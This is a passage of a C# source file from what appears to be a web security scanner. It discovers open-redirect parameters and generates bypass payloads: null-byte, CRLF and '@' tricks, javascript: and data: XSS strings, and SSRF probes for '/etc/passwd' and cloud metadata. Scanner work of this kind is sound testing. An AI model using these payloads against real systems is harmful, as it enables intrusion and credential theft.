using System.IO;
using System.Text;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Discovers redirect/url-like injection points from network traffic and DOM hrefs,
/// and generates context-aware open-redirect bypass payloads.
/// </summary>
public static class RedirectParamDiscovery
{
    /// <summary>Common open-redirect paths (Juice Shop, OAuth flows, labs, legacy apps).</summary>
    private static readonly (string Path, string Param)[] RedirectAlwaysProbed =
    [
        ("/redirect", "to"),
        ("/redirect", "url"),
        ("/redirect", "target"),
        ("/api/redirect", "url"),
        ("/api/redirect", "to"),
        ("/out", "url"),
        ("/go", "url"),
        ("/goto", "url"),
        ("/api/goto", "url"),
        ("/api/goto", "to"),
        ("/login/redirect", "url"),
        ("/oauth/authorize", "redirect_uri"),
        ("/oauth2/authorize", "redirect_uri"),
    ];

    private static readonly string[] RedirectPathSegments =
        ["redirect", "redir", "outbound", "out", "goto", "forward", "external", "leave"];

    private static readonly string[] RedirectPathHeuristicParams =
    [
        "to", "url", "redirect", "target", "next", "return", "returnUrl", "return_to",
        "redirectTo", "redirect_to", "continue", "go", "goTo", "go_to"
    ];

    public sealed class InjectionPoint
    {
        public required Uri BaseUri { get; init; }
        public required string ParamName { get; init; }
        public string? OriginalValue { get; init; }
        public string Method { get; init; } = "GET";
        public string Source { get; init; } = "network";
        /// <summary>Captured POST/JSON/form body when discovered from traffic or endpoint hints.</summary>
        public string? RequestBodySample { get; init; }
        public string? RequestContentType { get; init; }
    }

    public sealed class ProbeRequest
    {
        public required string Url { get; init; }
        public string? Body { get; init; }
        public Dictionary<string, string>? Headers { get; init; }
    }

    public static bool UsesRequestBody(InjectionPoint pt) =>
        !string.IsNullOrEmpty(pt.RequestBodySample)
        && pt.Method is "POST" or "PUT" or "PATCH";

    public static ProbeRequest BuildProbeRequest(InjectionPoint pt, string payload) =>
        BuildProbeRequest(pt, pt.ParamName, payload);

    public static ProbeRequest BuildProbeRequest(InjectionPoint pt, string paramName, string payload)
    {
        if (!UsesRequestBody(pt))
            return new ProbeRequest { Url = BuildProbeUrl(pt.BaseUri, paramName, payload) };

        var contentType = pt.RequestContentType ?? "application/x-www-form-urlencoded";
        var body = InjectParamIntoBody(pt.RequestBodySample!, paramName, payload, contentType);
        var url = pt.BaseUri.GetLeftPart(UriPartial.Path);
        if (!string.IsNullOrEmpty(pt.BaseUri.Query))
            url += pt.BaseUri.Query;

        return new ProbeRequest
        {
            Url = url,
            Body = body,
            Headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                ["Content-Type"] = contentType
            }
        };
    }

    internal static string InjectParamIntoBody(string sample, string paramName, string payload, string contentType)
    {
        if (contentType.Contains("json", StringComparison.OrdinalIgnoreCase))
        {
            try
            {
                using var doc = System.Text.Json.JsonDocument.Parse(sample);
                if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Object)
                    return sample;

                using var stream = new MemoryStream();
                using (var writer = new System.Text.Json.Utf8JsonWriter(stream))
                {
                    writer.WriteStartObject();
                    foreach (var prop in doc.RootElement.EnumerateObject())
                    {
                        writer.WritePropertyName(prop.Name);
                        if (prop.Name.Equals(paramName, StringComparison.OrdinalIgnoreCase)
                            && prop.Value.ValueKind == System.Text.Json.JsonValueKind.String)
                            writer.WriteStringValue(payload);
                        else
                            prop.Value.WriteTo(writer);
                    }

                    if (!doc.RootElement.EnumerateObject().Any(p =>
                            p.Name.Equals(paramName, StringComparison.OrdinalIgnoreCase)))
                    {
                        writer.WriteString(paramName, payload);
                    }

                    writer.WriteEndObject();
                }

                return Encoding.UTF8.GetString(stream.ToArray());
            }
            catch
            {
                return sample;
            }
        }

        if (contentType.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase)
            || sample.Contains('='))
        {
            var qs = System.Web.HttpUtility.ParseQueryString(sample);
            qs[paramName] = payload;
            return qs.ToString() ?? $"{paramName}={Uri.EscapeDataString(payload)}";
        }

        return sample;
    }

    public static List<InjectionPoint> DiscoverAll(
        AutomationContext ctx,
        string origin,
        ISet<string> paramNames,
        int max,
        List<string>? explicitUrls = null,
        List<EndpointParamHint>? endpointHints = null,
        bool includeNetwork = true,
        bool includeScaffold = true)
    {
        var list = new List<InjectionPoint>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        void Add(InjectionPoint pt) => MergeInjectionPoint(list, seen, pt);

        var hasExplicit =
            (explicitUrls is { Count: > 0 }) || (endpointHints is { Count: > 0 });

        // Caller-supplied targets first so they win key collisions and survive capping.
        if (endpointHints is { Count: > 0 })
        {
            foreach (var pt in FromHints(endpointHints, paramNames))
                Add(pt);
        }

        if (explicitUrls is { Count: > 0 })
        {
            foreach (var pt in FromUrls(explicitUrls, paramNames))
                Add(pt);
        }

        if (includeNetwork)
        {
            foreach (var pt in FromRedirectPathHeuristic(ctx.Network.Entries, origin, paramNames))
                Add(pt);

            foreach (var pt in FromNetwork(ctx.Network.Entries, origin, paramNames))
                Add(pt);
        }

        // Scaffolds are last-resort coverage. Skip them when the caller named targets —
        // otherwise /api/goto-style noise starves real sinks under maxCandidates.
        if (includeScaffold && !hasExplicit)
        {
            foreach (var pt in FromScaffold(origin, paramNames))
                Add(pt);
        }

        return PrioritizeAndCap(list, max);
    }

    /// <summary>
    /// Merge an injection point into the discovery list. Higher-priority sources replace lower ones
    /// on the same method|path|param key (so endpoint-hint is not silently dropped after a network hit).
    /// </summary>
    internal static void MergeInjectionPoint(
        List<InjectionPoint> list,
        HashSet<string> seen,
        InjectionPoint pt)
    {
        var key = $"{pt.Method}|{pt.BaseUri.GetLeftPart(UriPartial.Path)}|{pt.ParamName}";
        if (seen.Contains(key))
        {
            var idx = list.FindIndex(p =>
                $"{p.Method}|{p.BaseUri.GetLeftPart(UriPartial.Path)}|{p.ParamName}"
                    .Equals(key, StringComparison.OrdinalIgnoreCase));
            if (idx < 0) return;

            var existing = list[idx];
            var betterSource = SourcePriority(pt.Source) > SourcePriority(existing.Source);
            var betterValue = string.IsNullOrWhiteSpace(existing.OriginalValue)
                              && !string.IsNullOrWhiteSpace(pt.OriginalValue);
            if (!betterSource && !betterValue) return;

            list[idx] = new InjectionPoint
            {
                BaseUri = betterSource ? pt.BaseUri : existing.BaseUri,
                ParamName = existing.ParamName,
                OriginalValue = !string.IsNullOrWhiteSpace(pt.OriginalValue)
                    ? pt.OriginalValue
                    : existing.OriginalValue,
                Method = betterSource ? pt.Method : existing.Method,
                Source = betterSource ? pt.Source : existing.Source
            };
            return;
        }

        seen.Add(key);
        list.Add(pt);
    }

    public static IEnumerable<InjectionPoint> FromScaffold(string origin, ISet<string> paramNames)
    {
        if (string.IsNullOrWhiteSpace(origin) ||
            !Uri.TryCreate(origin, UriKind.Absolute, out var originUri))
            yield break;

        var baseOrigin = originUri.GetLeftPart(UriPartial.Authority);
        foreach (var (path, param) in RedirectAlwaysProbed)
        {
            if (!UrlLikeParamNames.IsRedirectLikeName(param) && !paramNames.Contains(param.ToLowerInvariant()))
                continue;

            if (!Uri.TryCreate(baseOrigin.TrimEnd('/') + path, UriKind.Absolute, out var uri))
                continue;

            yield return new InjectionPoint
            {
                BaseUri = uri,
                ParamName = param,
                Method = "GET",
                Source = "redirect-scaffold"
            };
        }
    }

    /// <summary>
    /// When traffic hits a redirect-looking path (e.g. <c>/redirect</c>) without query params,
    /// synthesize common redirect parameter names for probing.
    /// </summary>
    public static IEnumerable<InjectionPoint> FromRedirectPathHeuristic(
        List<NetworkEntry> entries, string origin, ISet<string> paramNames)
    {
        var seenPaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var e in entries)
        {
            if (e.StatusCode is < 200 or >= 500) continue;
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            var path = uri.AbsolutePath;
            if (!PathLooksRedirectLike(path))
                continue;

            var pathKey = uri.GetLeftPart(UriPartial.Path);
            if (!seenPaths.Add(pathKey)) continue;

            foreach (var name in RedirectPathHeuristicParams)
            {
                if (!paramNames.Contains(name.ToLowerInvariant())) continue;
                yield return new InjectionPoint
                {
                    BaseUri = new Uri(pathKey),
                    ParamName = name,
                    Method = "GET",
                    Source = "redirect-path-heuristic"
                };
            }
        }
    }

    private static bool PathLooksRedirectLike(string path)
    {
        foreach (var segment in path.Split('/', StringSplitOptions.RemoveEmptyEntries))
        {
            foreach (var pattern in RedirectPathSegments)
            {
                if (segment.Equals(pattern, StringComparison.OrdinalIgnoreCase))
                    return true;
            }
        }

        return false;
    }

    public static List<InjectionPoint> PrioritizeAndCap(List<InjectionPoint> list, int max)
    {
        var cap = max > 0 ? max : 12;
        if (list.Count <= cap)
            return list.OrderByDescending(pt => SourcePriority(pt.Source))
                .ThenBy(pt => pt.BaseUri.GetLeftPart(UriPartial.Path), StringComparer.OrdinalIgnoreCase)
                .ThenBy(pt => pt.ParamName, StringComparer.OrdinalIgnoreCase)
                .ToList();

        // Never starve caller-supplied URLs/hints behind scaffold noise (e.g. /api/goto?url=).
        var explicitPoints = list
            .Where(pt => IsCallerSuppliedSource(pt.Source))
            .OrderByDescending(pt => SourcePriority(pt.Source))
            .ThenBy(pt => pt.BaseUri.GetLeftPart(UriPartial.Path), StringComparer.OrdinalIgnoreCase)
            .ThenBy(pt => pt.ParamName, StringComparer.OrdinalIgnoreCase)
            .ToList();

        // Also reserve high-signal always-probed scaffolds (/api/goto?url=) so llm caps don't drop them.
        var alwaysScaffold = list
            .Where(pt => string.Equals(pt.Source, "scaffold", StringComparison.OrdinalIgnoreCase)
                         && IsAlwaysProbedRedirectPath(pt.BaseUri.AbsolutePath, pt.ParamName))
            .OrderBy(pt => pt.BaseUri.AbsolutePath, StringComparer.OrdinalIgnoreCase)
            .ThenBy(pt => pt.ParamName, StringComparer.OrdinalIgnoreCase)
            .ToList();

        var chosen = new List<InjectionPoint>(cap);
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        AddUntil(chosen, seen, explicitPoints, Math.Min(explicitPoints.Count, cap));
        // Keep at least ~1/3 of remaining slots for always-probed redirects.
        var scaffoldReserve = Math.Min(alwaysScaffold.Count, Math.Max(2, (cap - chosen.Count) / 3));
        AddUntil(chosen, seen, alwaysScaffold, chosen.Count + scaffoldReserve);
        AddUntil(
            chosen,
            seen,
            list
                .OrderByDescending(pt => SourcePriority(pt.Source))
                .ThenBy(pt => pt.BaseUri.GetLeftPart(UriPartial.Path), StringComparer.OrdinalIgnoreCase)
                .ThenBy(pt => pt.ParamName, StringComparer.OrdinalIgnoreCase),
            cap);

        return chosen;
    }

    private static bool IsAlwaysProbedRedirectPath(string path, string param) =>
        RedirectAlwaysProbed.Any(p =>
            path.EndsWith(p.Path, StringComparison.OrdinalIgnoreCase)
            && param.Equals(p.Param, StringComparison.OrdinalIgnoreCase));

    public static bool IsCallerSuppliedSource(string source) =>
        string.Equals(source, "explicit-url", StringComparison.OrdinalIgnoreCase)
        || string.Equals(source, "endpoint-hint", StringComparison.OrdinalIgnoreCase);

    private static void AddUntil(
        List<InjectionPoint> chosen,
        HashSet<string> seen,
        IEnumerable<InjectionPoint> src,
        int limit)
    {
        foreach (var pt in src)
        {
            if (chosen.Count >= limit) break;
            var key = $"{pt.Method}|{pt.BaseUri.GetLeftPart(UriPartial.Path)}|{pt.ParamName}";
            if (!seen.Add(key)) continue;
            chosen.Add(pt);
        }
    }

    internal static int SourcePriority(string source) => source switch
    {
        "explicit-url" => 120,
        "endpoint-hint" => 115,
        // Real traffic / DOM outrank synthetic scaffolds so labs and apps are not starved.
        "dom-href" => 100,
        "dom-form" => 95,
        "dom-page-url" => 90,
        "network" => 85,
        "network-body" => 80,
        "redirect-path-heuristic" => 50,
        "redirect-scaffold" => 40,
        _ => 20
    };

    /// <summary>Discovers URL-like form fields from DOM (name, type=url, placeholder/label hints).</summary>
    public static async Task<List<InjectionPoint>> DiscoverFromFormsAsync(
        AutomationContext ctx, string origin, ISet<string> paramNames, int max)
    {
        const string js = """
            (function(){
              var out=[];
              document.querySelectorAll('form').forEach(function(form){
                var action=form.action||location.href;
                var method=(form.method||'GET').toUpperCase();
                form.querySelectorAll('input,textarea,select').forEach(function(el){
                  var name=el.name||el.id||'';
                  if(!name) return;
                  var label='';
                  if(el.labels&&el.labels.length>0) label=(el.labels[0].textContent||'').trim();
                  out.push({
                    action: action,
                    method: method,
                    paramName: name,
                    type: (el.type||'').toLowerCase(),
                    placeholder: el.placeholder||'',
                    label: label,
                    value: (el.value||'').substring(0,200)
                  });
                });
              });
              return JSON.stringify(out);
            })()
            """;

        var json = await ctx.ExecuteJs(js);
        if (string.IsNullOrWhiteSpace(json))
            return [];

        var list = new List<InjectionPoint>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        try
        {
            using var doc = System.Text.Json.JsonDocument.Parse(json);
            foreach (var el in doc.RootElement.EnumerateArray())
            {
                var paramName = el.TryGetProperty("paramName", out var pn) ? pn.GetString() ?? "" : "";
                if (string.IsNullOrWhiteSpace(paramName)) continue;

                var type = el.TryGetProperty("type", out var tp) ? tp.GetString() ?? "" : "";
                var placeholder = el.TryGetProperty("placeholder", out var ph) ? ph.GetString() ?? "" : "";
                var label = el.TryGetProperty("label", out var lb) ? lb.GetString() ?? "" : "";
                var value = el.TryGetProperty("value", out var vl) ? vl.GetString() ?? "" : "";
                if (!UrlLikeParamNames.IsUrlLikeFormField(paramName, type, placeholder, label, value, paramNames))
                    continue;

                var action = el.TryGetProperty("action", out var ac) ? ac.GetString() ?? "" : "";
                var method = el.TryGetProperty("method", out var me) ? me.GetString() ?? "GET" : "GET";
                var pageUrl = await ctx.GetCurrentUrl();
                if (!TryResolveSameOrigin(pageUrl ?? action, action, origin, out var uri) || uri == null)
                    continue;

                var key = $"{method}|{uri.GetLeftPart(UriPartial.Path)}|{paramName}";
                if (!seen.Add(key)) continue;

                list.Add(new InjectionPoint
                {
                    BaseUri = uri,
                    ParamName = paramName,
                    OriginalValue = value,
                    Method = method,
                    Source = "dom-form"
                });
                if (list.Count >= max) break;
            }
        }
        catch { /* skip malformed DOM scan */ }

        return list;
    }

    public static async Task<List<InjectionPoint>> DiscoverFromDomAsync(
        AutomationContext ctx, string origin, ISet<string> paramNames, int max)
    {
        var pageUrl = await ctx.GetCurrentUrl();
        var elements = await ctx.GetInteractiveElements();
        return FromInteractiveElements(elements, pageUrl, origin, paramNames, max);
    }

    public static List<InjectionPoint> FromInteractiveElements(
        IReadOnlyList<Dictionary<string, object>>? elements,
        string? pageUrl,
        string origin,
        ISet<string> paramNames,
        int max)
    {
        if (elements == null || elements.Count == 0 || string.IsNullOrEmpty(pageUrl))
            return [];

        var spa = AttackSurfaceMapper.BuildSpaRuntimeSurface(elements, 0, pageUrl, null);
        var list = new List<InjectionPoint>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var link in spa.Links)
        {
            if (string.IsNullOrWhiteSpace(link.Href)) continue;
            if (!TryResolveSameOrigin(pageUrl, link.Href, origin, out var uri) || uri == null) continue;
            foreach (var pt in ExtractFromUri(uri, paramNames, "dom-href"))
            {
                var key = $"{pt.Method}|{pt.BaseUri}|{pt.ParamName}";
                if (!seen.Add(key)) continue;
                list.Add(pt);
                if (list.Count >= max) return list;
            }
        }

        // Current page URL may carry redirect params even when no link was clicked.
        if (Uri.TryCreate(pageUrl, UriKind.Absolute, out var pageUri) &&
            string.Equals(pageUri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
        {
            foreach (var pt in ExtractFromUri(pageUri, paramNames, "dom-page-url"))
            {
                var key = $"{pt.Method}|{pt.BaseUri}|{pt.ParamName}";
                if (!seen.Add(key)) continue;
                list.Add(pt);
                if (list.Count >= max) return list;
            }
        }

        return list;
    }

    public static IEnumerable<InjectionPoint> FromNetwork(
        List<NetworkEntry> entries, string origin, ISet<string> paramNames)
    {
        foreach (var e in entries)
        {
            if (e.StatusCode is < 200 or >= 500) continue;
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;

            var isRedirectEndpoint = RedirectAnalysis.IsRedirectStatus(e.StatusCode);
            foreach (var pt in ExtractFromUri(uri, paramNames, "network", isRedirectEndpoint))
                yield return pt;

            if (e.Method is "POST" or "PUT" or "PATCH" && !string.IsNullOrEmpty(e.RequestBody))
            {
                foreach (var pt in ExtractFromBody(e, uri, paramNames))
                    yield return pt;
            }
        }
    }

    private static IEnumerable<InjectionPoint> ExtractFromBody(
        NetworkEntry entry, Uri uri, ISet<string> paramNames)
    {
        var ct = entry.RequestHeaders.TryGetValue("Content-Type", out var h) ? h :
            entry.RequestHeaders.TryGetValue("content-type", out var h2) ? h2 : "";

        if (ct.Contains("json", StringComparison.OrdinalIgnoreCase))
        {
            List<InjectionPoint>? jsonPoints = null;
            try
            {
                using var doc = System.Text.Json.JsonDocument.Parse(entry.RequestBody!);
                if (doc.RootElement.ValueKind == System.Text.Json.JsonValueKind.Object)
                {
                    jsonPoints = new List<InjectionPoint>();
                    foreach (var prop in doc.RootElement.EnumerateObject())
                    {
                        var val = prop.Value.ValueKind == System.Text.Json.JsonValueKind.String
                            ? prop.Value.GetString() ?? "" : "";
                        if (!UrlLikeParamNames.IsUrlLikeParam(prop.Name, val, paramNames))
                            continue;
                        jsonPoints.Add(new InjectionPoint
                        {
                            BaseUri = uri,
                            ParamName = prop.Name,
                            OriginalValue = val,
                            Method = entry.Method,
                            Source = "network-body",
                            RequestBodySample = entry.RequestBody,
                            RequestContentType = ct
                        });
                    }
                }
            }
            catch { /* skip */ }

            if (jsonPoints != null)
            {
                foreach (var pt in jsonPoints)
                    yield return pt;
            }
        }
        else if (ct.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase))
        {
            var qs = System.Web.HttpUtility.ParseQueryString(entry.RequestBody!);
            foreach (string? key in qs)
            {
                if (key == null) continue;
                var val = qs[key] ?? "";
                if (!UrlLikeParamNames.IsUrlLikeParam(key, val, paramNames))
                    continue;
                yield return new InjectionPoint
                {
                    BaseUri = uri,
                    ParamName = key,
                    OriginalValue = val,
                    Method = entry.Method,
                    Source = "network-body",
                    RequestBodySample = entry.RequestBody,
                    RequestContentType = string.IsNullOrWhiteSpace(ct)
                        ? "application/x-www-form-urlencoded"
                        : ct
                };
            }
        }
    }

    /// <summary>Base URL for probes: scheme + authority + path (no query/fragment).</summary>
    internal static Uri NormalizeInjectionBaseUri(Uri uri) =>
        Uri.TryCreate(uri.GetLeftPart(UriPartial.Path), UriKind.Absolute, out var pathOnly)
            ? pathOnly
            : uri;

    public static IEnumerable<InjectionPoint> FromUrls(List<string> urls, ISet<string> paramNames)
    {
        foreach (var url in urls)
        {
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)) continue;
            // Bare paths (no query) still get redirect-like params synthesized — callers often
            // pass the form/action URL without the redirect query string.
            var points = ExtractFromUri(uri, paramNames, "explicit-url",
                includeAllOnRedirectEndpoint: string.IsNullOrEmpty(uri.Query) || uri.Query == "?",
                acceptAllQueryParams: true).ToList();
            if (points.Count == 0)
            {
                foreach (var name in paramNames)
                {
                    points.Add(new InjectionPoint
                    {
                        BaseUri = new Uri(uri.GetLeftPart(UriPartial.Path)),
                        ParamName = name,
                        Method = "GET",
                        Source = "explicit-url"
                    });
                }
            }

            foreach (var pt in points)
                yield return pt;
        }
    }

    public static IEnumerable<InjectionPoint> FromHints(
        List<EndpointParamHint> hints, ISet<string> paramNames)
    {
        foreach (var hint in hints)
        {
            if (!Uri.TryCreate(hint.Url, UriKind.Absolute, out var uri)) continue;
            var baseUri = NormalizeInjectionBaseUri(uri);
            string? OriginalFor(string paramName)
            {
                if (!string.IsNullOrEmpty(hint.RequestBodySample))
                {
                    var ct = hint.Headers?.TryGetValue("Content-Type", out var h) == true ? h : "";
                    if (ct.Contains("json", StringComparison.OrdinalIgnoreCase))
                    {
                        try
                        {
                            using var doc = System.Text.Json.JsonDocument.Parse(hint.RequestBodySample);
                            if (doc.RootElement.TryGetProperty(paramName, out var el)
                                && el.ValueKind == System.Text.Json.JsonValueKind.String)
                                return el.GetString();
                        }
                        catch { /* fall through */ }
                    }

                    if (ct.Contains("form-urlencoded", StringComparison.OrdinalIgnoreCase)
                        || hint.RequestBodySample.Contains('='))
                    {
                        var bodyQs = System.Web.HttpUtility.ParseQueryString(hint.RequestBodySample);
                        var fromBody = bodyQs[paramName];
                        if (!string.IsNullOrEmpty(fromBody))
                            return fromBody;
                    }
                }

                if (string.IsNullOrEmpty(uri.Query)) return null;
                var qs = System.Web.HttpUtility.ParseQueryString(uri.Query);
                return qs[paramName];
            }

            var contentType = hint.Headers?.TryGetValue("Content-Type", out var ctHint) == true
                ? ctHint
                : null;

            foreach (var param in hint.ParamNames)
            {
                if (string.IsNullOrWhiteSpace(param)) continue;
                yield return new InjectionPoint
                {
                    BaseUri = baseUri,
                    ParamName = param,
                    OriginalValue = OriginalFor(param),
                    Method = hint.Method,
                    Source = "endpoint-hint",
                    RequestBodySample = hint.RequestBodySample,
                    RequestContentType = contentType
                };
            }
        }
    }

    private static IEnumerable<InjectionPoint> ExtractFromUri(
        Uri uri, ISet<string> paramNames, string source, bool includeAllOnRedirectEndpoint = false,
        bool acceptAllQueryParams = false)
    {
        var query = uri.Query;
        if (string.IsNullOrEmpty(query) || query == "?")
        {
            if (includeAllOnRedirectEndpoint)
            {
                // Prefer high-signal redirect params (url/to/…) over the full RedirectLike set so
                // depth=llm caps don't keep alphabetically-first names like "continue" and miss /goto?url=.
                var preferred = PathLooksRedirectLike(uri.AbsolutePath)
                    ? RedirectPathHeuristicParams.Concat(["url", "redirect", "target", "next", "to"]).Distinct(
                        StringComparer.OrdinalIgnoreCase)
                    : RedirectPathHeuristicParams;
                foreach (var name in preferred)
                {
                    yield return new InjectionPoint
                    {
                        BaseUri = NormalizeInjectionBaseUri(uri),
                        ParamName = name,
                        Method = "GET",
                        Source = source
                    };
                }
            }
            yield break;
        }

        var basePath = NormalizeInjectionBaseUri(uri);
        foreach (var part in query.TrimStart('?').Split('&', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        {
            var eq = part.IndexOf('=');
            if (eq < 0) continue;
            var key = Uri.UnescapeDataString(part[..eq]);
            var value = Uri.UnescapeDataString(part[(eq + 1)..]);

            if (!acceptAllQueryParams
                && !UrlLikeParamNames.IsUrlLikeParam(key, value, paramNames)
                && !(includeAllOnRedirectEndpoint && UrlLikeParamNames.IsRedirectLikeName(key)))
                continue;

            yield return new InjectionPoint
            {
                BaseUri = basePath,
                ParamName = key,
                OriginalValue = value,
                Method = "GET",
                Source = source
            };
        }
    }

    private static bool TryResolveSameOrigin(string pageUrl, string href, string origin, out Uri? resolved)
    {
        resolved = null;
        if (!Uri.TryCreate(pageUrl, UriKind.Absolute, out var baseUri)) return false;
        if (!Uri.TryCreate(baseUri, href, out resolved)) return false;
        return string.Equals(resolved.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Standard + substring bypass payloads for a candidate.</summary>
    public static List<string> BuildPayloads(
        string probeHost,
        string? originalValue,
        bool includeAdaptive = true,
        List<string>? customPayloads = null)
    {
        if (customPayloads is { Count: > 0 })
            return customPayloads;

        var list = new List<string>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        void Add(string p)
        {
            if (seen.Add(p)) list.Add(p);
        }

        Add($"https://{probeHost}/");
        Add($"//{probeHost}/");

        foreach (var p in GenerateSubstringBypassPayloads(probeHost, originalValue))
            Add(p);

        foreach (var template in DefaultBypassTemplates)
            Add(template.Replace("{PROBE}", probeHost, StringComparison.Ordinal));

        if (includeAdaptive)
        {
            Add("javascript:alert(1)");
            Add("data:text/html,<script>alert(1)</script>");
            // Generic null-byte truncation toward probe (when no allowlist prefix is known yet)
            Add($"https://example.com%00https://{probeHost}/");
            Add($"https://trusted.example%00https://{probeHost}/");
        }

        return list;
    }

    /// <summary>Payloads to probe after a basic open redirect works — tests SSRF via redirect param.</summary>
    public static IEnumerable<string> SsrfEscalationPayloads() =>
    [
        "file:///etc/passwd",
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "gopher://127.0.0.1:25/",
    ];

    /// <summary>Combine an allowlisted redirect prefix with bypass techniques toward the probe host.</summary>
    public static IEnumerable<string> GenerateAllowlistBypassPayloads(string allowlistedUrl, string probeHost)
    {
        if (string.IsNullOrWhiteSpace(allowlistedUrl)) yield break;

        var baseUrl = allowlistedUrl.Trim();
        if (!baseUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
            !baseUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            yield break;

        var trimmed = baseUrl.TrimEnd('/');
        var probeUrl = $"https://{probeHost}/";

        // Use pre-encoded %XX sequences (EscapeQueryParamValue preserves existing %XX);
        // literal \0 chars get dropped by Uri.EscapeDataString in .NET.
        yield return $"{trimmed}%00{probeUrl}";
        yield return $"{trimmed}%00@{probeHost}/";
        yield return $"{trimmed}%0d%0a{probeUrl}";
        yield return $"{trimmed}%23{probeUrl}";
        yield return $"{trimmed}%3F{probeUrl}";
        yield return $"{trimmed}?url={probeUrl}";
        yield return $"{trimmed}?{probeHost}";

        yield return $"{trimmed}/../../{probeHost}/";
        yield return $"{trimmed}@{probeHost}/";
        yield return $"{trimmed}%23@{probeHost}/";
        yield return $"{trimmed}/../{probeHost}/.";
        yield return $"{trimmed}/@{probeHost}/";
        yield return $"{trimmed}../../../{probeHost}/";
        yield return $"{trimmed}/..%2f{probeHost}/";
    }

    /// <summary>
    /// Collects external http(s) URLs from page links — both direct external links
    /// and URL values embedded in query parameters of same-origin redirect-like links.
    /// </summary>
    public static async Task<List<string>> CollectWhitelistCandidatesFromPageAsync(
        AutomationContext ctx, string origin, int max = 20)
    {
        var values = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var pageUrl = await ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(pageUrl))
            return [];

        var elements = await ctx.GetInteractiveElements();
        if (elements is not { Count: > 0 })
            return [];

        var spa = AttackSurfaceMapper.BuildSpaRuntimeSurface(elements, 0, pageUrl, null, maxLinkRows: 400);
        foreach (var link in spa.Links)
        {
            if (string.IsNullOrWhiteSpace(link.Href)) continue;
            if (!Uri.TryCreate(pageUrl, UriKind.Absolute, out var baseUri)) continue;
            if (!Uri.TryCreate(baseUri, link.Href, out var resolved) || !resolved.IsAbsoluteUri) continue;

            if (string.Equals(resolved.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
            {
                // Same-origin link: extract URL values from query params (e.g. /redirect?to=https://...)
                if (!string.IsNullOrEmpty(resolved.Query))
                {
                    var qs = System.Web.HttpUtility.ParseQueryString(resolved.Query);
                    foreach (string? key in qs)
                    {
                        if (key == null) continue;
                        var val = qs[key];
                        if (string.IsNullOrWhiteSpace(val)) continue;
                        val = val.Trim();
                        if ((val.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                             val.StartsWith("https://", StringComparison.OrdinalIgnoreCase)) &&
                            !val.Contains(origin, StringComparison.OrdinalIgnoreCase))
                        {
                            values.Add(val);
                            if (values.Count >= max) break;
                        }
                    }
                }
            }
            else
            {
                // External link: use directly
                if (resolved.Scheme.Equals(Uri.UriSchemeHttp, StringComparison.OrdinalIgnoreCase) ||
                    resolved.Scheme.Equals(Uri.UriSchemeHttps, StringComparison.OrdinalIgnoreCase))
                {
                    var url = resolved.GetLeftPart(UriPartial.Path);
                    if (!string.IsNullOrEmpty(resolved.Query))
                        url += resolved.Query;
                    values.Add(url);
                }
            }

            if (values.Count >= max) break;
        }

        return values.ToList();
    }

    /// <summary>HTTP URL param values observed on redirect endpoints (302/303 or full http URLs in traffic).</summary>
    public static List<string> CollectAllowlistedRedirectValues(
        List<NetworkEntry> entries, string origin, Uri baseUri, string paramName)
    {
        var values = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var targetPath = baseUri.GetLeftPart(UriPartial.Path);

        foreach (var e in entries)
        {
            if (!Uri.TryCreate(e.Url, UriKind.Absolute, out var uri)) continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Authority), origin, StringComparison.OrdinalIgnoreCase))
                continue;
            if (!string.Equals(uri.GetLeftPart(UriPartial.Path), targetPath, StringComparison.OrdinalIgnoreCase))
                continue;

            var qs = System.Web.HttpUtility.ParseQueryString(uri.Query);
            var val = qs[paramName];
            if (string.IsNullOrWhiteSpace(val)) continue;
            val = val.Trim();
            if (!val.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                !val.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                continue;

            if (RedirectAnalysis.IsRedirectStatus(e.StatusCode) || val.Contains('.', StringComparison.Ordinal))
                values.Add(val);
        }

        return values.ToList();
    }

    public static IEnumerable<string> GenerateSubstringBypassPayloads(string probeHost, string? originalValue)
    {
        if (string.IsNullOrWhiteSpace(originalValue)) yield break;

        var normalized = originalValue.Trim().TrimStart('/');
        if (normalized.Length == 0) yield break;

        if (normalized.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
            normalized.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
        {
            foreach (var p in GenerateAllowlistBypassPayloads(normalized, probeHost))
                yield return p;
        }

        var pathOnly = normalized.Split('?')[0];
        var querySuffix = normalized.Contains('?') ? normalized[(normalized.IndexOf('?') + 1)..] : null;

        yield return $"https://{probeHost}/{normalized}";
        yield return $"https://{probeHost}/{pathOnly}";
        yield return $"//{probeHost}/{normalized}";
